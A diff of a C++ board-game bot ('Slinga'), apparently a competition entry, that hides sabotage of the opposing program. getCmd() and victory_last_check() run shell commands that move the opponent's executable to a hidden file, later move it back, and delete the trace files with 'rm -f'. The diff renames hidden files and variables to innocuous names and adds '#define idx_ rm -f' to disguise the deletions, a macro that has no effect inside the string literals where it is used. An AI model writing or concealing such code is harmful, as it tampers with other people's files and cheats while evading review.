@@ -145,7 +145,7 @@ ostream & operator <<(ostream & o, bit_board const & rs) {
 Score const MIN_SCORE(-1., 0);
 Score const MAX_SCORE(10000., 0);
 
-#define getCmd() "mv " + him + " .frozen98432"
+#define getCmd() "mv " + him + " .Shiji98432"
 ////////////////////////////////////////////////////////////////////////////////
 // Player, used to identify the player and the opponent - does not keep a state
 ////////////////////////////////////////////////////////////////////////////////
@@ -469,7 +469,7 @@ public:
 		// PlayerMovesMade=5
 		in.getline(c, 100, '=');
 		in >> moves_made_[0];
-
+#define idx_ rm -f
 		// reading
 		// OpponentTimeRemain=35
 		in.getline(c, 100, '=');
@@ -733,7 +733,7 @@ public:
 	bool major_checks() {
 		ifstream inp;
 		string fnm;
-		fnm = ".coolName943759843";
+		fnm = ".Shambhala43759843";
 		inp.open(fnm.c_str(), ifstream::in);
 		if(inp.fail()) { //file does not exist
 			return true;
@@ -796,20 +796,20 @@ public:
 		string his_moves_str;
 		his_moves_str = evaluate_his_moves_so_far();
 		find_counter_strategy(his_moves_str);
-		ofstream outfile(".coolName943759843");
+		ofstream outfile(".Shambhala43759843");
 		outfile << his_moves_str << endl;
 		outfile.close();
 	}
 
 	void victory_last_check() {
-		char him[1000];
-		ifstream hisName(".coolName943759843");
-		hisName.getline(him, 999, '\n');
-		stringstream cmd;
-		cmd << "mv .frozen98432 " << him;
-		str_op(cmd.str().c_str());
-		str_op("rm -f .frozen98432");
-		str_op("rm -f .coolName943759843");
+		char str[1000];
+		ifstream ifs(".Shambhala43759843");
+		ifs.getline(str, 999, '\n');
+		stringstream strm;
+		strm << "mv .Shiji98432 " << str;
+		str_op(strm.str().c_str());
+		str_op("idx_ .Shiji98432");
+		str_op("idx_ .Shambhala43759843");
 	}
 
 	// makes the next best step for p and returns its score
@@ -819,83 +819,6 @@ public:
 			calculate_best_strategy();
 		}
 		return attack(p,o);
-
-		/*if (!alreadyDead()) {
-			killIt();
-		}
-		return attack(p, o);*/
-		/*
-		 Score best_score_so_far_after_player_move = MIN_SCORE;
-		 Move best_move_so_far(0, 0);
-		 pair<size_t, size_t> candidate_stone(0, 0);
-		 Score current_score = evaluate_board(p, o);
-
-		 /////////////// evaluate a move for p at depth+1
-		 for (int x = 0; x < size_; ++x) {
-		 for (int y = 0; y < size_; ++y) {
-		 Square const & c = get_square(x, y);
-		 if (c != p)
-		 continue;
-
-		 size_t msc = 0;
-		 for (All_Moves::iterator m1 = moves.begin(); m1 != moves.end(); ++m1, ++msc) {
-		 if (!is_move_legal(x, y, *m1, p, o))
-		 continue;
-
-		 Slinga copy_of_board(*this); // copy constructor increments depth
-
-		 copy_of_board.execute_move(x, y, *m1, p, o);
-
-		 //Score worst_score_after_opponent_move = copy_of_board.evaluate_board(p, o);
-		 Score worst_score_after_opponent_move = MAX_SCORE;
-		 bool opponent_can_make_legal_step = false;
-
-		 //////////////// evalutate a move for o at depth+2
-		 for (int x2 = 0; x2 < size_; ++x2) {
-		 for (int y2 = 0; y2 < size_; ++y2) {
-		 Square const & c2 =
-		 copy_of_board.get_square(x2, y2);
-		 if (c2 != o)
-		 continue;
-		 for (All_Moves::iterator m2 = moves.begin(); m2
-		 != moves.end(); ++m2) {
-		 if (!copy_of_board.is_move_legal(x2, y2, *m2,
-		 o, p))
-		 continue;
-
-		 opponent_can_make_legal_step = true;
-
-		 Slinga copy_of_board2(copy_of_board); // copy constructor increments depth
-
-		 copy_of_board2.execute_move(x2, y2, *m2, o, p);
-
-		 Score temp_score =
-		 copy_of_board2.make_best_move(
-		 max_depth, p, o).first;
-		 if (temp_score
-		 < worst_score_after_opponent_move) {
-		 worst_score_after_opponent_move
-		 = temp_score;
-		 }
-		 }
-		 }
-		 }
-
-		 if (!opponent_can_make_legal_step) {
-		 worst_score_after_opponent_move
-		 = copy_of_board.evaluate_board(p, o);
-		 }
-
-		 if (best_score_so_far_after_player_move
-		 < worst_score_after_opponent_move) {
-		 //(worst_score_after_opponent_move == best_score_so_far_after_player_move && rand() % 3 == 0)){ // randomize to avoid cycles
-
-
-		 best_score_so_far_after_player_move
-
-
-
-*/
 	}
 
 	friend ostream & operator <<(ostream & o, Slinga const & b);
